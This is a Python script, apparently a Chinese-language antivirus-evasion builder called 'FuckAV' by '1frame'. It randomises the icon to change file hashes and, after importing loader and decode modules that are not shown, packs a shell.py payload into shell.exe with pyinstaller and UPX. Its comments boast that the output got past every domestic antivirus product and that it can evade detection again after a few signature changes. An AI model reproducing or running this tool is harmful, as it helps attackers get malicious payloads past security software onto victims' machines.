import os
import time
from colorama import init,Fore,Back,Style
from PIL import Image
from PIL import ImageDraw
from PIL import ImageFont
import random

init(autoreset=True)
# 脚本采用python3.7编写
# 采用pyinstaller打包，使用之前请安装pyinstaller
# 运行之前先确认一下pip库有没有安装
# 因为开源了嘛，估计要不了半个月就会被加入360豪华套餐了，但是整个程序够简单，被杀了再去改几个特征码照样又可以免杀半个月
# 反正我自己用了半个月，一直都是国内杀软全过
# 保持更新，但是频率比较慢，因为我只是个没用的安服
# 不得不说这个脚本确实有很多地方是在造轮子，但是是有意造的轮子，看似造轮子，实则是为了以后方便魔改（说白了就是菜，因为我是一个没用的安服）

print(f"""
╔============================================================================╗
║                                                                            ║
║    ███████╗    ██╗   ██╗     ██████╗    ██╗  ██╗     █████╗ ██╗   ██╗      ║
║    ██╔════╝    ██║   ██║    ██╔════╝    ██║ ██╔╝    ██╔══██╗██║   ██║      ║
║    █████╗      ██║   ██║    ██║         █████╔╝     ███████║██║   ██║      ║
║    ██╔══╝      ██║   ██║    ██║         ██╔═██╗     ██╔══██║╚██╗ ██╔╝      ║
║    ██║         ╚██████╔╝    ╚██████╗    ██║  ██╗    ██║  ██║ ╚████╔╝       ║
║    ╚═╝          ╚═════╝      ╚═════╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝  ╚═══╝ V1.2   ║
║  Author:1frame                                             Time:2021-9-13  ║
╚============================================================================╝
""")
print('\033[1;31;40m''[*]''\033[1;37;40m'" exp: python FuckAV.py")
print()
print('\033[1;34;40m''[*]''\033[1;37;40m'" exe用法: 直接运行shell.exe即可 ")
print()
print('\033[1;33;40m''[*]''\033[1;37;40m'" 安装依赖库: pip install -r requirement.txt ")
print()
print("====================================================================")
print()
print('\033[1;31;40m''[1]''\033[1;37;40m'": 编译生成exe")
print('\033[1;31;40m''[2]''\033[1;37;40m'": 生成powershell脚本（暂未开发）")
xz=input(f"""
[♥] 选择1/2: """)

def getRandomStr():
    chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';
    charLen = len(chars)
    pwd = ''
    resultLen = random.randint(10, 20)
    while len(pwd) < resultLen:
        pwd += chars[random.randint(0,charLen-1)]
    return pwd

def ico_change():
    font = ImageFont.truetype("C:\Windows\Fonts\Arial.ttf", 24)
    imageFile = "ico.ico"
    im1 = Image.open(imageFile)
    draw = ImageDraw.Draw(im1)
    draw.text((random.randint(1,128), random.randint(1,128)), "1frame  "+getRandomStr(), (random.randint(50,220), random.randint(50,220), random.randint(50,220)), font=font)    #设置文字位置/内容/颜色/字体
    draw = ImageDraw.Draw(im1)
    im1.save("ico.ico")


if xz=="1":
        import loader
        ico_change()
        import decode
        os.system ("pyinstaller -F -w -i ico.ico shell.py -n shell.exe --upx-dir=upx\\")
        print()
        time.sleep(2)
        print('\033[1;32;40m''[♥]''\033[1;37;40m'"===================exe打包完成====================")
        print('\033[1;34;40m''[*]''\033[1;37;40m'" exe路径:\dist\shell.exe")
        os.system("pause")
        os.system("python fuckav.py")

